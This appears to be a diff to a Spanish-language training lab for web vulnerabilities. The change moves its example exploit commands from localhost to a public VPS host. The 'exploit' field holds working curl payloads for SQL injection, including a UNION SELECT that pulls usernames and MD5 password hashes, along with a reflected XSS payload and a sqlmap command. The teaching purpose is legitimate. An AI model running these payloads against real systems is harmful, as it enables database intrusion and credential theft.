@@ -32,17 +32,17 @@ WHERE name LIKE \'%" . $_GET[\'q\'] . "%\'";</pre>
             <li><strong>XSS reflejado:</strong> el output no esta sanitizado</li>
         </ul>
     ',
-    'exploit' => '# SQL Injection basico - ver todos los clientes
-curl "http://localhost:8082/a05_clientes/buscar.php?q=\' OR \'1\'=\'1"
+    'exploit' => '# SQL Injection basico - ver todos los clientes en la VPS
+curl "https://nexolab.guajilodev.com/a05_clientes/buscar.php?q=\' OR \'1\'=\'1"
 
 # UNION - extraer usuarios y passwords (MD5)
-curl "http://localhost:8082/a05_clientes/buscar.php?q=\' UNION SELECT id,username,password_md5,email,role,created_at,7,8 FROM users-- "
+curl "https://nexolab.guajilodev.com/a05_clientes/buscar.php?q=\' UNION SELECT id,username,password_md5,email,role,created_at,7,8 FROM users-- "
 
 # XSS reflejado
-curl "http://localhost:8082/a05_clientes/buscar.php?q=<script>alert(\'XSS\')</script>"
+curl "https://nexolab.guajilodev.com/a05_clientes/buscar.php?q=<script>alert(\'XSS\')</script>"
 
 # SQLMap automatizado
-sqlmap -u "http://localhost:8082/a05_clientes/buscar.php?q=test" --dbs',
+sqlmap -u "https://nexolab.guajilodev.com/a05_clientes/buscar.php?q=test" --dbs',
     'prevention' => '// VULNERABLE (buscar.php):
 $q = "SELECT * FROM clients WHERE name LIKE \'%" . $_GET[\'q\'] . "%\'";
 $result = $conn->query($q);
